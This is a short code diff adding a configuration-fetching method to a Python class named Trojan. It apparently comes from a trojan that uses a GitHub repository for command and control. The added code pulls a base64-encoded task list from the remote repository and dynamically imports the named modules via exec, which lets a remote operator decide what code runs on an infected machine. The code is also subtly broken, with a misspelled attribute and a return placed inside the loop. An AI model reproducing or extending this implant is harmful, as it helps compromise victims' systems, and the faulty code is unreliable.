@@ -25,3 +25,12 @@ class Trojan:
         self.config_file = f'{id}.json'
         self.data_path = f'data/{id}/'
         self.repo = github_connect()
+    
+    def get_config(self):
+        config_json = get_file_contents('config', self.config_filem, self.repo)
+        config = json.loads(base64.b64decode(config_json))
+
+        for task in config:
+            if task['module'] not in sys.modules:
+                exec("import %s" % task['module'])
+            return config
